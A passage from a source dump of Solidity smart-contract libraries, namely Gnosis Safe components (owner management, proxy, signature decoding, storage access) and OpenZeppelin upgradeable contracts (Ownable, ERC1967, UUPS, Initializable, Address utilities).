    |         owners[newOwner] = owners[oldOwner];
    |         owners[prevOwner] = newOwner;
    |         owners[oldOwner] = address(0);
    |         emit RemovedOwner(oldOwner);
    |         emit AddedOwner(newOwner);
    |     }
    | 
    |     /// @dev Allows to update the number of required confirmations by Safe owners.
    |     ///      This can only be done via a Safe transaction.
    |     /// @notice Changes the threshold of the Safe to `_threshold`.
    |     /// @param _threshold New threshold.
    |     function changeThreshold(uint256 _threshold) public authorized {
    |         // Validate that threshold is smaller than number of owners.
    |         require(_threshold <= ownerCount, "GS201");
    |         // There has to be at least one Safe owner.
    |         require(_threshold >= 1, "GS202");
    |         threshold = _threshold;
    |         emit ChangedThreshold(threshold);
    |     }
    | 
    |     function getThreshold() public view returns (uint256) {
    |         return threshold;
    |     }
    | 
    |     function isOwner(address owner) public view returns (bool) {
    |         return owner != SENTINEL_OWNERS && owners[owner] != address(0);
    |     }
    | 
    |     /// @dev Returns array of owners.
    |     /// @return Array of Safe owners.
    |     function getOwners() public view returns (address[] memory) {
    |         address[] memory array = new address[](ownerCount);
    | 
    |         // populate return array
    |         uint256 index = 0;
    |         address currentOwner = owners[SENTINEL_OWNERS];
    |         while (currentOwner != SENTINEL_OWNERS) {
    |             array[index] = currentOwner;
    |             currentOwner = owners[currentOwner];
    |             index++;
    |         }
    |         return array;
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/Enum.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title Enum - Collection of enums
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract Enum {
    |     enum Operation {Call, DelegateCall}
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/EtherPaymentFallback.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title EtherPaymentFallback - A contract that has a fallback to accept ether payments
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract EtherPaymentFallback {
    |     event SafeReceived(address indexed sender, uint256 value);
    | 
    |     /// @dev Fallback function accepts Ether transactions.
    |     receive() external payable {
    |         emit SafeReceived(msg.sender, msg.value);
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/SecuredTokenTransfer.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title SecuredTokenTransfer - Secure token transfer
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract SecuredTokenTransfer {
    |     /// @dev Transfers a token and returns if it was a success
    |     /// @param token Token that should be transferred
    |     /// @param receiver Receiver to whom the token should be transferred
    |     /// @param amount The amount of tokens that should be transferred
    |     function transferToken(
    |         address token,
    |         address receiver,
    |         uint256 amount
    |     ) internal returns (bool transferred) {
    |         // 0xa9059cbb - keccack("transfer(address,uint256)")
    |         bytes memory data = abi.encodeWithSelector(0xa9059cbb, receiver, amount);
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             // We write the return value to scratch space.
    |             // See https://docs.soliditylang.org/en/v0.7.6/internals/layout_in_memory.html#layout-in-memory
    |             let success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20)
    |             switch returndatasize()
    |                 case 0 {
    |                     transferred := success
    |                 }
    |                 case 0x20 {
    |                     transferred := iszero(or(iszero(success), iszero(mload(0))))
    |                 }
    |                 default {
    |                     transferred := 0
    |                 }
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/SelfAuthorized.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title SelfAuthorized - authorizes current contract to perform actions
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract SelfAuthorized {
    |     function requireSelfCall() private view {
    |         require(msg.sender == address(this), "GS031");
    |     }
    | 
    |     modifier authorized() {
    |         // This is a function call as it minimized the bytecode size
    |         requireSelfCall();
    |         _;
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/SignatureDecoder.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title SignatureDecoder - Decodes signatures that a encoded as bytes
    | /// @author Richard Meissner - <richard@gnosis.pm>
    | contract SignatureDecoder {
    |     /// @dev divides bytes signature into `uint8 v, bytes32 r, bytes32 s`.
    |     /// @notice Make sure to peform a bounds check for @param pos, to avoid out of bounds access on @param signatures
    |     /// @param pos which signature to read. A prior bounds check of this parameter should be performed, to avoid out of bounds access
    |     /// @param signatures concatenated rsv signatures
    |     function signatureSplit(bytes memory signatures, uint256 pos)
    |         internal
    |         pure
    |         returns (
    |             uint8 v,
    |             bytes32 r,
    |             bytes32 s
    |         )
    |     {
    |         // The signature format is a compact form of:
    |         //   {bytes32 r}{bytes32 s}{uint8 v}
    |         // Compact means, uint8 is not padded to 32 bytes.
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             let signaturePos := mul(0x41, pos)
    |             r := mload(add(signatures, add(signaturePos, 0x20)))
    |             s := mload(add(signatures, add(signaturePos, 0x40)))
    |             // Here we are loading the last 32 bytes, including 31 bytes
    |             // of 's'. There is no 'mload8' to do this.
    |             //
    |             // 'byte' is not working due to the Solidity parser, so lets
    |             // use the second best option, 'and'
    |             v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff)
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/Singleton.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title Singleton - Base for singleton contracts (should always be first super contract)
    | ///         This contract is tightly coupled to our proxy contract (see `proxies/GnosisSafeProxy.sol`)
    | /// @author Richard Meissner - <richard@gnosis.io>
    | contract Singleton {
    |     // singleton always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract.
    |     // It should also always be ensured that the address is stored alone (uses a full word)
    |     address private singleton;
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/common/StorageAccessible.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title StorageAccessible - generic base contract that allows callers to access all internal storage.
    | /// @notice See https://github.com/gnosis/util-contracts/blob/bb5fe5fb5df6d8400998094fb1b32a178a47c3a1/contracts/StorageAccessible.sol
    | contract StorageAccessible {
    |     /**
    |      * @dev Reads `length` bytes of storage in the currents contract
    |      * @param offset - the offset in the current contract's storage in words to start reading from
    |      * @param length - the number of words (32 bytes) of data to read
    |      * @return the bytes that were read.
    |      */
    |     function getStorageAt(uint256 offset, uint256 length) public view returns (bytes memory) {
    |         bytes memory result = new bytes(length * 32);
    |         for (uint256 index = 0; index < length; index++) {
    |             // solhint-disable-next-line no-inline-assembly
    |             assembly {
    |                 let word := sload(add(offset, index))
    |                 mstore(add(add(result, 0x20), mul(index, 0x20)), word)
    |             }
    |         }
    |         return result;
    |     }
    | 
    |     /**
    |      * @dev Performs a delegetecall on a targetContract in the context of self.
    |      * Internally reverts execution to avoid side effects (making it static).
    |      *
    |      * This method reverts with data equal to `abi.encode(bool(success), bytes(response))`.
    |      * Specifically, the `returndata` after a call to this method will be:
    |      * `success:bool || response.length:uint256 || response:bytes`.
    |      *
    |      * @param targetContract Address of the contract containing the code to execute.
    |      * @param calldataPayload Calldata that should be sent to the target contract (encoded method name and arguments).
    |      */
    |     function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)
    | 
    |             mstore(0x00, success)
    |             mstore(0x20, returndatasize())
    |             returndatacopy(0x40, 0, returndatasize())
    |             revert(0, add(returndatasize(), 0x40))
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/external/GnosisSafeMath.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /**
    |  * @title GnosisSafeMath
    |  * @dev Math operations with safety checks that revert on error
    |  * Renamed from SafeMath to GnosisSafeMath to avoid conflicts
    |  * TODO: remove once open zeppelin update to solc 0.5.0
    |  */
    | library GnosisSafeMath {
    |     /**
    |      * @dev Multiplies two numbers, reverts on overflow.
    |      */
    |     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    |         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    |         // benefit is lost if 'b' is also tested.
    |         // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    |         if (a == 0) {
    |             return 0;
    |         }
    | 
    |         uint256 c = a * b;
    |         require(c / a == b);
    | 
    |         return c;
    |     }
    | 
    |     /**
    |      * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
    |      */
    |     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    |         require(b <= a);
    |         uint256 c = a - b;
    | 
    |         return c;
    |     }
    | 
    |     /**
    |      * @dev Adds two numbers, reverts on overflow.
    |      */
    |     function add(uint256 a, uint256 b) internal pure returns (uint256) {
    |         uint256 c = a + b;
    |         require(c >= a);
    | 
    |         return c;
    |     }
    | 
    |     /**
    |      * @dev Returns the largest of two numbers.
    |      */
    |     function max(uint256 a, uint256 b) internal pure returns (uint256) {
    |         return a >= b ? a : b;
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/interfaces/ISignatureValidator.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | contract ISignatureValidatorConstants {
    |     // bytes4(keccak256("isValidSignature(bytes,bytes)")
    |     bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;
    | }
    | 
    | abstract contract ISignatureValidator is ISignatureValidatorConstants {
    |     /**
    |      * @dev Should return whether the signature provided is valid for the provided data
    |      * @param _data Arbitrary length data signed on the behalf of address(this)
    |      * @param _signature Signature byte array associated with _data
    |      *
    |      * MUST return the bytes4 magic value 0x20c13b0b when function passes.
    |      * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)
    |      * MUST allow external calls
    |      */
    |     function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | 
    | /// @title IProxy - Helper interface to access masterCopy of the Proxy on-chain
    | /// @author Richard Meissner - <richard@gnosis.io>
    | interface IProxy {
    |     function masterCopy() external view returns (address);
    | }
    | 
    | /// @title GnosisSafeProxy - Generic proxy contract allows to execute all transactions applying the code of a master contract.
    | /// @author Stefan George - <stefan@gnosis.io>
    | /// @author Richard Meissner - <richard@gnosis.io>
    | contract GnosisSafeProxy {
    |     // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
    |     // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt`
    |     address internal singleton;
    | 
    |     /// @dev Constructor function sets address of singleton contract.
    |     /// @param _singleton Singleton address.
    |     constructor(address _singleton) {
    |         require(_singleton != address(0), "Invalid singleton address provided");
    |         singleton = _singleton;
    |     }
    | 
    |     /// @dev Fallback function forwards all transactions and returns all received return data.
    |     fallback() external payable {
    |         // solhint-disable-next-line no-inline-assembly
    |         assembly {
    |             let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff)
    |             // 0xa619486e == keccak("masterCopy()"). The value is right padded to 32-bytes with 0s
    |             if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) {
    |                 mstore(0, _singleton)
    |                 return(0, 0x20)
    |             }
    |             calldatacopy(0, 0, calldatasize())
    |             let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0)
    |             returndatacopy(0, 0, returndatasize())
    |             if eq(success, 0) {
    |                 revert(0, returndatasize())
    |             }
    |             return(0, returndatasize())
    |         }
    |     }
    | }
    | 

/src/node_modules/@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol
    | // SPDX-License-Identifier: LGPL-3.0-only
    | pragma solidity >=0.7.0 <0.9.0;
    | import "./GnosisSafeProxy.sol";
    | 
    | interface IProxyCreationCallback {
    |     function proxyCreated(
    |         GnosisSafeProxy proxy,
    |         address _singleton,
    |         bytes calldata initializer,
    |         uint256 saltNonce
    |     ) external;
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../utils/ContextUpgradeable.sol";
    | import "../proxy/utils/Initializable.sol";
    | 
    | /**
    |  * @dev Contract module which provides a basic access control mechanism, where
    |  * there is an account (an owner) that can be granted exclusive access to
    |  * specific functions.
    |  *
    |  * By default, the owner account will be the one that deploys the contract. This
    |  * can later be changed with {transferOwnership}.
    |  *
    |  * This module is used through inheritance. It will make available the modifier
    |  * `onlyOwner`, which can be applied to your functions to restrict their use to
    |  * the owner.
    |  */
    | abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    |     address private _owner;
    | 
    |     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    | 
    |     /**
    |      * @dev Initializes the contract setting the deployer as the initial owner.
    |      */
    |     function __Ownable_init() internal initializer {
    |         __Context_init_unchained();
    |         __Ownable_init_unchained();
    |     }
    | 
    |     function __Ownable_init_unchained() internal initializer {
    |         _setOwner(_msgSender());
    |     }
    | 
    |     /**
    |      * @dev Returns the address of the current owner.
    |      */
    |     function owner() public view virtual returns (address) {
    |         return _owner;
    |     }
    | 
    |     /**
    |      * @dev Throws if called by any account other than the owner.
    |      */
    |     modifier onlyOwner() {
    |         require(owner() == _msgSender(), "Ownable: caller is not the owner");
    |         _;
    |     }
    | 
    |     /**
    |      * @dev Leaves the contract without owner. It will not be possible to call
    |      * `onlyOwner` functions anymore. Can only be called by the current owner.
    |      *
    |      * NOTE: Renouncing ownership will leave the contract without an owner,
    |      * thereby removing any functionality that is only available to the owner.
    |      */
    |     function renounceOwnership() public virtual onlyOwner {
    |         _setOwner(address(0));
    |     }
    | 
    |     /**
    |      * @dev Transfers ownership of the contract to a new account (`newOwner`).
    |      * Can only be called by the current owner.
    |      */
    |     function transferOwnership(address newOwner) public virtual onlyOwner {
    |         require(newOwner != address(0), "Ownable: new owner is the zero address");
    |         _setOwner(newOwner);
    |     }
    | 
    |     function _setOwner(address newOwner) private {
    |         address oldOwner = _owner;
    |         _owner = newOwner;
    |         emit OwnershipTransferred(oldOwner, newOwner);
    |     }
    |     uint256[49] private __gap;
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/proxy/ERC1967/ERC1967UpgradeUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.2;
    | 
    | import "../beacon/IBeaconUpgradeable.sol";
    | import "../../utils/AddressUpgradeable.sol";
    | import "../../utils/StorageSlotUpgradeable.sol";
    | import "../utils/Initializable.sol";
    | 
    | /**
    |  * @dev This abstract contract provides getters and event emitting update functions for
    |  * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.
    |  *
    |  * _Available since v4.1._
    |  *
    |  * @custom:oz-upgrades-unsafe-allow delegatecall
    |  */
    | abstract contract ERC1967UpgradeUpgradeable is Initializable {
    |     function __ERC1967Upgrade_init() internal initializer {
    |         __ERC1967Upgrade_init_unchained();
    |     }
    | 
    |     function __ERC1967Upgrade_init_unchained() internal initializer {
    |     }
    |     // This is the keccak-256 hash of "eip1967.proxy.rollback" subtracted by 1
    |     bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;
    | 
    |     /**
    |      * @dev Storage slot with the address of the current implementation.
    |      * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
    |      * validated in the constructor.
    |      */
    |     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    | 
    |     /**
    |      * @dev Emitted when the implementation is upgraded.
    |      */
    |     event Upgraded(address indexed implementation);
    | 
    |     /**
    |      * @dev Returns the current implementation address.
    |      */
    |     function _getImplementation() internal view returns (address) {
    |         return StorageSlotUpgradeable.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    |     }
    | 
    |     /**
    |      * @dev Stores a new address in the EIP1967 implementation slot.
    |      */
    |     function _setImplementation(address newImplementation) private {
    |         require(AddressUpgradeable.isContract(newImplementation), "ERC1967: new implementation is not a contract");
    |         StorageSlotUpgradeable.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
    |     }
    | 
    |     /**
    |      * @dev Perform implementation upgrade
    |      *
    |      * Emits an {Upgraded} event.
    |      */
    |     function _upgradeTo(address newImplementation) internal {
    |         _setImplementation(newImplementation);
    |         emit Upgraded(newImplementation);
    |     }
    | 
    |     /**
    |      * @dev Perform implementation upgrade with additional setup call.
    |      *
    |      * Emits an {Upgraded} event.
    |      */
    |     function _upgradeToAndCall(
    |         address newImplementation,
    |         bytes memory data,
    |         bool forceCall
    |     ) internal {
    |         _upgradeTo(newImplementation);
    |         if (data.length > 0 || forceCall) {
    |             _functionDelegateCall(newImplementation, data);
    |         }
    |     }
    | 
    |     /**
    |      * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    |      *
    |      * Emits an {Upgraded} event.
    |      */
    |     function _upgradeToAndCallSecure(
    |         address newImplementation,
    |         bytes memory data,
    |         bool forceCall
    |     ) internal {
    |         address oldImplementation = _getImplementation();
    | 
    |         // Initial upgrade and setup call
    |         _setImplementation(newImplementation);
    |         if (data.length > 0 || forceCall) {
    |             _functionDelegateCall(newImplementation, data);
    |         }
    | 
    |         // Perform rollback test if not already in progress
    |         StorageSlotUpgradeable.BooleanSlot storage rollbackTesting = StorageSlotUpgradeable.getBooleanSlot(_ROLLBACK_SLOT);
    |         if (!rollbackTesting.value) {
    |             // Trigger rollback using upgradeTo from the new implementation
    |             rollbackTesting.value = true;
    |             _functionDelegateCall(
    |                 newImplementation,
    |                 abi.encodeWithSignature("upgradeTo(address)", oldImplementation)
    |             );
    |             rollbackTesting.value = false;
    |             // Check rollback was effective
    |             require(oldImplementation == _getImplementation(), "ERC1967Upgrade: upgrade breaks further upgrades");
    |             // Finally reset to the new implementation and log the upgrade
    |             _upgradeTo(newImplementation);
    |         }
    |     }
    | 
    |     /**
    |      * @dev Storage slot with the admin of the contract.
    |      * This is the keccak-256 hash of "eip1967.proxy.admin" subtracted by 1, and is
    |      * validated in the constructor.
    |      */
    |     bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    | 
    |     /**
    |      * @dev Emitted when the admin account has changed.
    |      */
    |     event AdminChanged(address previousAdmin, address newAdmin);
    | 
    |     /**
    |      * @dev Returns the current admin.
    |      */
    |     function _getAdmin() internal view returns (address) {
    |         return StorageSlotUpgradeable.getAddressSlot(_ADMIN_SLOT).value;
    |     }
    | 
    |     /**
    |      * @dev Stores a new address in the EIP1967 admin slot.
    |      */
    |     function _setAdmin(address newAdmin) private {
    |         require(newAdmin != address(0), "ERC1967: new admin is the zero address");
    |         StorageSlotUpgradeable.getAddressSlot(_ADMIN_SLOT).value = newAdmin;
    |     }
    | 
    |     /**
    |      * @dev Changes the admin of the proxy.
    |      *
    |      * Emits an {AdminChanged} event.
    |      */
    |     function _changeAdmin(address newAdmin) internal {
    |         emit AdminChanged(_getAdmin(), newAdmin);
    |         _setAdmin(newAdmin);
    |     }
    | 
    |     /**
    |      * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.
    |      * This is bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)) and is validated in the constructor.
    |      */
    |     bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;
    | 
    |     /**
    |      * @dev Emitted when the beacon is upgraded.
    |      */
    |     event BeaconUpgraded(address indexed beacon);
    | 
    |     /**
    |      * @dev Returns the current beacon.
    |      */
    |     function _getBeacon() internal view returns (address) {
    |         return StorageSlotUpgradeable.getAddressSlot(_BEACON_SLOT).value;
    |     }
    | 
    |     /**
    |      * @dev Stores a new beacon in the EIP1967 beacon slot.
    |      */
    |     function _setBeacon(address newBeacon) private {
    |         require(AddressUpgradeable.isContract(newBeacon), "ERC1967: new beacon is not a contract");
    |         require(
    |             AddressUpgradeable.isContract(IBeaconUpgradeable(newBeacon).implementation()),
    |             "ERC1967: beacon implementation is not a contract"
    |         );
    |         StorageSlotUpgradeable.getAddressSlot(_BEACON_SLOT).value = newBeacon;
    |     }
    | 
    |     /**
    |      * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does
    |      * not upgrade the implementation contained in the beacon (see {UpgradeableBeacon-_setImplementation} for that).
    |      *
    |      * Emits a {BeaconUpgraded} event.
    |      */
    |     function _upgradeBeaconToAndCall(
    |         address newBeacon,
    |         bytes memory data,
    |         bool forceCall
    |     ) internal {
    |         _setBeacon(newBeacon);
    |         emit BeaconUpgraded(newBeacon);
    |         if (data.length > 0 || forceCall) {
    |             _functionDelegateCall(IBeaconUpgradeable(newBeacon).implementation(), data);
    |         }
    |     }
    | 
    |     /**
    |      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
    |      * but performing a delegate call.
    |      *
    |      * _Available since v3.4._
    |      */
    |     function _functionDelegateCall(address target, bytes memory data) private returns (bytes memory) {
    |         require(AddressUpgradeable.isContract(target), "Address: delegate call to non-contract");
    | 
    |         // solhint-disable-next-line avoid-low-level-calls
    |         (bool success, bytes memory returndata) = target.delegatecall(data);
    |         return AddressUpgradeable.verifyCallResult(success, returndata, "Address: low-level delegate call failed");
    |     }
    |     uint256[50] private __gap;
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/proxy/beacon/IBeaconUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev This is the interface that {BeaconProxy} expects of its beacon.
    |  */
    | interface IBeaconUpgradeable {
    |     /**
    |      * @dev Must return an address that can be used as a delegate call target.
    |      *
    |      * {BeaconProxy} will check that this address is a contract.
    |      */
    |     function implementation() external view returns (address);
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
    |  * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor logic to an
    |  * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
    |  * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
    |  *
    |  * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
    |  * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
    |  *
    |  * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
    |  * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
    |  */
    | abstract contract Initializable {
    |     /**
    |      * @dev Indicates that the contract has been initialized.
    |      */
    |     bool private _initialized;
    | 
    |     /**
    |      * @dev Indicates that the contract is in the process of being initialized.
    |      */
    |     bool private _initializing;
    | 
    |     /**
    |      * @dev Modifier to protect an initializer function from being invoked twice.
    |      */
    |     modifier initializer() {
    |         require(_initializing || !_initialized, "Initializable: contract is already initialized");
    | 
    |         bool isTopLevelCall = !_initializing;
    |         if (isTopLevelCall) {
    |             _initializing = true;
    |             _initialized = true;
    |         }
    | 
    |         _;
    | 
    |         if (isTopLevelCall) {
    |             _initializing = false;
    |         }
    |     }
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | import "../ERC1967/ERC1967UpgradeUpgradeable.sol";
    | import "./Initializable.sol";
    | 
    | /**
    |  * @dev An upgradeability mechanism designed for UUPS proxies. The functions included here can perform an upgrade of an
    |  * {ERC1967Proxy}, when this contract is set as the implementation behind such a proxy.
    |  *
    |  * A security mechanism ensures that an upgrade does not turn off upgradeability accidentally, although this risk is
    |  * reinstated if the upgrade retains upgradeability but removes the security mechanism, e.g. by replacing
    |  * `UUPSUpgradeable` with a custom implementation of upgrades.
    |  *
    |  * The {_authorizeUpgrade} function must be overridden to include access restriction to the upgrade mechanism.
    |  *
    |  * _Available since v4.1._
    |  */
    | abstract contract UUPSUpgradeable is Initializable, ERC1967UpgradeUpgradeable {
    |     function __UUPSUpgradeable_init() internal initializer {
    |         __ERC1967Upgrade_init_unchained();
    |         __UUPSUpgradeable_init_unchained();
    |     }
    | 
    |     function __UUPSUpgradeable_init_unchained() internal initializer {
    |     }
    |     /// @custom:oz-upgrades-unsafe-allow state-variable-immutable state-variable-assignment
    |     address private immutable __self = address(this);
    | 
    |     /**
    |      * @dev Check that the execution is being performed through a delegatecall call and that the execution context is
    |      * a proxy contract with an implementation (as defined in ERC1967) pointing to self. This should only be the case
    |      * for UUPS and transparent proxies that are using the current contract as their implementation. Execution of a
    |      * function through ERC1167 minimal proxies (clones) would not normally pass this test, but is not guaranteed to
    |      * fail.
    |      */
    |     modifier onlyProxy() {
    |         require(address(this) != __self, "Function must be called through delegatecall");
    |         require(_getImplementation() == __self, "Function must be called through active proxy");
    |         _;
    |     }
    | 
    |     /**
    |      * @dev Upgrade the implementation of the proxy to `newImplementation`.
    |      *
    |      * Calls {_authorizeUpgrade}.
    |      *
    |      * Emits an {Upgraded} event.
    |      */
    |     function upgradeTo(address newImplementation) external virtual onlyProxy {
    |         _authorizeUpgrade(newImplementation);
    |         _upgradeToAndCallSecure(newImplementation, new bytes(0), false);
    |     }
    | 
    |     /**
    |      * @dev Upgrade the implementation of the proxy to `newImplementation`, and subsequently execute the function call
    |      * encoded in `data`.
    |      *
    |      * Calls {_authorizeUpgrade}.
    |      *
    |      * Emits an {Upgraded} event.
    |      */
    |     function upgradeToAndCall(address newImplementation, bytes memory data) external payable virtual onlyProxy {
    |         _authorizeUpgrade(newImplementation);
    |         _upgradeToAndCallSecure(newImplementation, data, true);
    |     }
    | 
    |     /**
    |      * @dev Function that should revert when `msg.sender` is not authorized to upgrade the contract. Called by
    |      * {upgradeTo} and {upgradeToAndCall}.
    |      *
    |      * Normally, this function will use an xref:access.adoc[access control] modifier such as {Ownable-onlyOwner}.
    |      *
    |      * ```solidity
    |      * function _authorizeUpgrade(address) internal override onlyOwner {}
    |      * ```
    |      */
    |     function _authorizeUpgrade(address newImplementation) internal virtual;
    |     uint256[50] private __gap;
    | }
    | 

/src/node_modules/@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol
    | // SPDX-License-Identifier: MIT
    | 
    | pragma solidity ^0.8.0;
    | 
    | /**
    |  * @dev Collection of functions related to the address type
    |  */
    | library AddressUpgradeable {
    |     /**
    |      * @dev Returns true if `account` is a contract.
    |      *
    |      * [IMPORTANT]
    |      * ====
    |      * It is unsafe to assume that an address for which this function returns
    |      * false is an externally-owned account (EOA) and not a contract.
    |      *
    |      * Among others, `isContract` will return false for the following
    |      * types of addresses:
    |      *
    |      *  - an externally-owned account
    |      *  - a contract in construction
    |      *  - an address where a contract will be created
    |      *  - an address where a contract lived, but was destroyed
    |      * ====
    |      */
    |     function isContract(address account) internal view returns (bool) {
    |         // This method relies on extcodesize, which returns 0 for contracts in
    |         // construction, since the code is only stored at the end of the
    |         // constructor execution.
    | 
    |         uint256 size;
    |         assembly {
    |             size := extcodesize(account)
    |         }
    |         return size > 0;
    |     }
    | 
    |     /**
    |      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
    |      * `recipient`, forwarding all available gas and reverting on errors.
    |      *
    |      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
    |      * of certain opcodes, possibly making contracts go over the 2300 gas limit
    |      * imposed by `transfer`, making them unable to receive funds via
    |      * `transfer`. {sendValue} removes this limitation.
    |      *
    |      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
    |      *
    |      * IMPORTANT: because control is transferred to `recipient`, care must be
    |      * taken to not create reentrancy vulnerabilities. Consider using
    |      * {ReentrancyGuard} or the
    |      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
    |      */
    |     function sendValue(address payable recipient, uint256 amount) internal {
    |         require(address(this).balance >= amount, "Address: insufficient balance");
    | 
    |         (bool success, ) = recipient.call{value: amount}("");
    |         require(success, "Address: unable to send value, recipient may have reverted");
    |     }
    | 
    |     /**
    |      * @dev Performs a Solidity function call using a low level `call`. A
    |      * plain `call` is an unsafe replacement for a function call: use this
    |      * function instead.
    |      *
    |      * If `target` reverts with a revert reason, it is bubbled up by this
    |      * function (like regular Solidity function calls).
    |      *
    |      * Returns the raw returned data. To convert to the expected return value,
    |      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
    |      *
    |      * Requirements:
    |      *
    |      * - `target` must be a contract.
    |      * - calling `target` with `data` must not revert.
    |      *
    |      * _Available since v3.1._
    |      */
